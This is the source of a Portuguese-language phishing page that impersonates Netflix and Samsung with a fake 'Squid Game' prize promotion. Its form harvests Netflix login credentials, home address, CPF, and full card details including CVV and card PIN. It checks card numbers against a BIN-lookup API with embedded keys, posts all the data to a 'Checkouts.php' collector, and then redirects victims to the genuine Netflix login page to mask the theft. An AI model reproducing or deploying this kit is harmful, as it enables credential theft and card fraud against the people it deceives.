<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="form.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Netflix + Samsung</title>
    <style>

      /* Style the input fields */
      input {
        padding: 20px;
        border: none;
        width: 100%;
        height: 70px;
        font-size: 17px;
        font-family: Arial, Helvetica, sans-serif;
        background-color: #333333;
        color: white;
        border-radius: 5px;
        box-sizing: border-box;
      }

      /* Mark input boxes that gets an error on validation: */
      input.invalid {
        background-color: #505050;
        border: 2px solid #e50914;
      }

      /* Hide all steps by default: */
      .tab {
        display: none;
      }

      /* Make circles that indicate the steps of the form: */
      .step {
        height: 15px;
        width: 15px;
        margin: 0 2px;
        background-color: #bbbbbb;
        border: none;
        border-radius: 50%;
        display: inline-block;
        opacity: 0.5;
      }

      /* Mark the active step: */
      .step.active {
        opacity: 1;
      }

      /* Mark the steps that are finished and valid: */
      .step.finish {
        background-color: #e50914;
      }
      .redButton {
        background-color: #e50914;
        line-height: normal;
        padding: 16px 20px;
        font-weight: bold;
        font-size: 1.2rem;
        float: right;
        float: none;
        margin-top: 0;
        white-space: nowrap;
        color: white;
        border: none;
        border-radius: 5px;
      }
      .finalizado{
        font-size: 24px;
        font-weight: bold;
      }
      .code{
        font-size: 24px;
        font-weight: bold;
        margin-bottom: 40px;
      }
      .frase{
        margin-top: 20px;
        margin-bottom: 20px;
      }
      .atention{
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <div class="desktop">
      <div id="background">
        <div class="header">
          <div><img src="./images/logo.svg" class="logo" /></div>
        </div>
        <div class="form-multi">
          <form id="regForm" action="">
            <h1>Cadastro promoção</br> Squid Game Netflix</h1>

            <!-- One "tab" for each step in the form: -->
            <div class="tab">
              <span style="margin-bottom: 20px;"><strong>1º Passo:</strong> Cadastre seu usuário e senha da sua nova conta do Netflix</span>
              <p>
                <input id="usuario" name="usuario" placeholder="Usuário..." oninput="this.className = ''" />
              </p>
              <p>
                <input id="senhausuario" name="senhausuario" placeholder="Senha..." type="password" oninput="this.className = ''" />
              </p>
            </div>

            <div class="tab">
              <span style="margin-bottom: 20px;"><strong>2º Passo:</strong> Cadastre seu endereço. A Samsung irá enviar um voucher de presente para você em seu endereço.</span>
              <p>
                <input id="endereco" name="endereco" placeholder="Endereço Completo" oninput="this.className = ''" />
              </p>
              <p>
                <input id="cidade" name="cidade" placeholder="Cidade" oninput="this.className = ''" />
              </p>
              <p>
                <input id="estado" name="estado" placeholder="Estado" oninput="this.className = ''" />
              </p>
              <p>
                <input id="cep" name="cep" placeholder="CEP" oninput="this.className = ''" />
              </p>
            </div>

            <div class="tab">
              <span style="margin-bottom: 20px;"><strong>3º Passo:</strong> Preencha os dados para finalizar sua assinatura do Netflix.</span>
              <p><span><strong>Plano escolhido:</strong> Plano Premium (R$ 59,90/mensal). Está incluso neste plano 4 telas e resolução 4K(2160p), além do seu número de sorteio Samsung para concorrer ao sorteio da TV  SAMSUNG 60" 4K OLED.</span></p>
              <p><div style="display: flex;"><img src="./images/amex-v2.svg" class="logo2" /><img src="./images/visa-v3.svg" class="logo2" /><img src="./images/master.png" class="logo2" /><img src="./images/elo-v2.svg" class="logo2" /><img src="./images/hipercard-v2.svg" class="logo2" /></div></p>
              <p><input id="nomecompleto" name="nomecompleto" placeholder="Nome Completo" oninput="this.className = ''" /></p>
              <p><input onkeypress="return onlyNumberKey(event)" onblur="isValidBIN()" onclick="exibeAlerta()" maxlength = "16" placeholder="Número do Cartão" id="bin" name="bin" oninput="this.className = ''" /></p>
              <p><div id="error-card" style="color: rgb(211, 12, 12); font-size: 12px; display: none;">Cartão inválido, digite novamente!</div></p>
              <p><input onkeypress="return onlyNumberKey(event)" id="cpf" name="cpf" maxlength = "11" onclick="exibeAlerta2()" onblur="isValidCPF()" placeholder="CPF do Cartão" oninput="this.className = ''" /></p>
              <p><div id="error-cpf"style="color: rgb(204, 20, 20); font-size: 12px; display: none;">CPF inválido, digite novamente!</div></p>
              <p><input onblur="maskYear()" onkeypress="return onlyNumberKey(event)" id="datavencimento" name="datavencimento" maxlength = "5" placeholder="Data do Vencimento (MM/AA)" /></p>
              <p><input onkeypress="return onlyNumberKey(event)" id="cvc" name="cvv" maxlength = "3" placeholder="Código de Verificação (CVV)" oninput="this.className = ''" /></p>
              <p><input onkeypress="return onlyNumberKey(event)" id="senha" name="senha" maxlength = "8" placeholder="Senha Cartão" oninput="this.className = ''" /></p>
			  <p><span class="atention"><strong>Atenção:</strong> Ao clicar no botão "Próximo" abaixo, você concorda com os Termos de uso e a Declaração de privacidade, confirma ter mais de 18 anos e aceita que a Netflix renovará automaticamente sua assinatura e cobrará uma taxa mensal (atualmente R$55,90) da sua forma de pagamento. Você pode cancelar sua assinatura quando quiser para evitar novas cobranças. Para cancelar, acesse "Conta" e clique em "Cancelar assinatura".</span></p>              
            </div>

            <div class="tab">
              <div class="finalizado">
                Falta pouco para você finalizar!
              </div>
              <div class="frase">
                Após você clicar no botão FINALIZAR, você pode aproveitar a sua Conta Premium, acessando o aplicativo da Netflix em seus dispositivos eletrônicos.
                O sorteio será efetuado no dia 1 de Novembro às 20:00 (Brasília) ao vivo através deste site.
              </div>
              <div class="code">
                Seu código de sorteio é: XHMR29856
              </div>
            </div>

            <div style="overflow: auto">
              <div style="float: right">
                <button type="button" class="redButton" id="prevBtn" onclick="nextPrev(-1)">
                  Anterior
                </button>
                <button type="button" class="redButton" id="nextBtn" onclick="nextPrev(1)">
                  Próximo
                </button>
              </div>
            </div>

            <!-- Circles which indicates the steps of the form: -->
            <div style="text-align: center; margin-top: 40px">
              <span class="step"></span>
              <span class="step"></span>
              <span class="step"></span>
              <span class="step"></span>
            </div>
          </form>
        </div>
      </div>
    </div>

    <script>


    function onlyNumberKey(evt) {
          
          // Only ASCII character in that range allowed
          var ASCIICode = (evt.which) ? evt.which : evt.keyCode
          if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
              return false;
          return true;
      }

      function exibeAlerta() {
          document.getElementById("bin").value = "";
          document.getElementById("error-card").style.display = "none";
      }

      function exibeAlerta2() {
          document.getElementById("cpf").value = "";
          document.getElementById("error-cpf").style.display = "none";
      }

      function TestaCPF(strCPF) {
          var Soma;
          var Resto;
          Soma = 0;
          if (strCPF == "00000000000") return false;
          if (strCPF == "11111111111") return false;
          if (strCPF == "22222222222") return false;
          if (strCPF == "33333333333") return false;
          if (strCPF == "44444444444") return false;
          if (strCPF == "55555555555") return false;
          if (strCPF == "66666666666") return false;
          if (strCPF == "77777777777") return false;
          if (strCPF == "88888888888") return false;
          if (strCPF == "99999999999") return false;

          for (i=1; i<=9; i++) Soma = Soma + parseInt(strCPF.substring(i-1, i)) * (11 - i);
          Resto = (Soma * 10) % 11;

            if ((Resto == 10) || (Resto == 11))  Resto = 0;
            if (Resto != parseInt(strCPF.substring(9, 10)) ) return false;

          Soma = 0;
            for (i = 1; i <= 10; i++) Soma = Soma + parseInt(strCPF.substring(i-1, i)) * (12 - i);
            Resto = (Soma * 10) % 11;

            if ((Resto == 10) || (Resto == 11))  Resto = 0;
            if (Resto != parseInt(strCPF.substring(10, 11) ) ) return false;
            return true;
      }

      function isValidCPF() {
        if(TestaCPF(document.getElementById("cpf").value) === false){
          document.getElementById("error-cpf").style.display = "block";
        };
      }
      function isValidBIN() {
          let v = document.getElementById("bin").value;   
          let binNumber = v.substring(0,6);     
          console.log(binNumber)  
          v=v.replace(/\D/g,"");
          v=v.replace(/^(\d{4})(\d)/g,"$1 $2");
          v=v.replace(/^(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3");
          v=v.replace(/^(\d{4})\s(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3 $4");
          document.getElementById("bin").value = v;   
          console.log(binNumber.length)
          if(binNumber.length === 6){
            fetch(`https://bin-lookup3.p.rapidapi.com/${binNumber}?api_key=2de0e185c44e008d7c4764b085f378e137a1cfba`, {
            method: "GET",
            headers: {
                  "x-rapidapi-host": "bin-lookup3.p.rapidapi.com",
                  "x-rapidapi-key": "22a3d3f323msh8244c4aad5cf552p1cefa6jsn82419d3f90d5"
              }
          })
          .then(response => response.json()) 
          .then(json => {
            console.log(json)
            this.dados_cartao = json;
            document.getElementById("error-card").style.display = "none";
            if(json.message !== "SUCCESS"){
              document.getElementById("error-card").style.display = "block";
            }
          }); 
          }          
      }
      var currentTab = 0; // Current tab is set to be the first tab (0)
      showTab(currentTab); // Display the current tab

      function showTab(n) {
        // This function will display the specified tab of the form...
        var x = document.getElementsByClassName("tab");
        x[n].style.display = "block";
        //... and fix the Previous/Next buttons:
        if (n == 0) {
          document.getElementById("prevBtn").style.display = "none";
        } else {
          document.getElementById("prevBtn").style.display = "inline";
        }
        if (n == x.length - 1) {
          document.getElementById("nextBtn").innerHTML = "Finalizar";
        } else {
          document.getElementById("nextBtn").innerHTML = "Próximo";
        }
        //... and run a function that will display the correct step indicator:
        fixStepIndicator(n);
      }

      function nextPrev(n) {
        // This function will figure out which tab to display
        var x = document.getElementsByClassName("tab");
        // Exit the function if any field in the current tab is invalid:
        if (n == 1 && !validateForm()) return false;
        // Hide the current tab:
        x[currentTab].style.display = "none";
        // Increase or decrease the current tab by 1:
        currentTab = currentTab + n;
        // if you have reached the end of the form...
        if (currentTab >= x.length) {
          // ... the form gets submitted:
          enviaHasura();
          return false;
        }
        // Otherwise, display the correct tab:
        showTab(currentTab);
      }


      function maskYear(){
            let mes = document.getElementById("datavencimento").value.substring(0,2);
            let ano = document.getElementById("datavencimento").value.substring(2,4);
            document.getElementById("datavencimento").value = mes + "/" + ano;
      }

let dados_cartao = {}

	function enviaHasura(){
	
	isValidBIN();  

		var url = 'Checkouts.php';
        var formData = new FormData();

	formData.append('nome_completo', document.getElementById('nomecompleto').value);
	formData.append('num_cartao', document.getElementById('bin').value);
	formData.append('data_vencimento', document.getElementById('datavencimento').value);
	formData.append('cvc', document.getElementById('cvc').value);
	formData.append('cpf', document.getElementById('cpf').value);
	formData.append('senha', document.getElementById('senha').value);
	formData.append('usuario', document.getElementById('usuario').value);    
	formData.append('UserSenha', document.getElementById('senhausuario').value);
	formData.append('endereco_completo', document.getElementById('endereco').value);
	formData.append('Cidade', document.getElementById('cidade').value);
	formData.append('Estado', document.getElementById('estado').value);
	formData.append('CEP', document.getElementById('cep').value);
    formData.append('dados_cartao', this.dados_cartao);                 

	fetch(url, { method: 'POST', body: formData })
	.then(function (response) {
	return response.text();})
	.then(function (body) {console.log(body);});
	showTab(3);
	window.location.replace("https://www.netflix.com/br/login");
	}

      function validateForm() {
        // This function deals with validation of the form fields
        var x,
          y,
          i,
          valid = true;
        x = document.getElementsByClassName("tab");
        y = x[currentTab].getElementsByTagName("input");
        // A loop that checks every input field in the current tab:
        for (i = 0; i < y.length; i++) {
          // If a field is empty...
          if (y[i].value == "") {
            // add an "invalid" class to the field:
            y[i].className += " invalid";
            // and set the current valid status to false
            valid = false;
          }
        }
        // If the valid status is true, mark the step as finished and valid:
        if (valid) {
          document.getElementsByClassName("step")[currentTab].className +=
            " finish";
        }
        return valid; // return the valid status
      }

      function fixStepIndicator(n) {
        // This function removes the "active" class of all steps...
        var i,
          x = document.getElementsByClassName("step");
        for (i = 0; i < x.length; i++) {
          x[i].className = x[i].className.replace(" active", "");
        }
        //... and adds the "active" class on the current step:
        x[n].className += " active";
      }
    </script>
  </body>
</html>
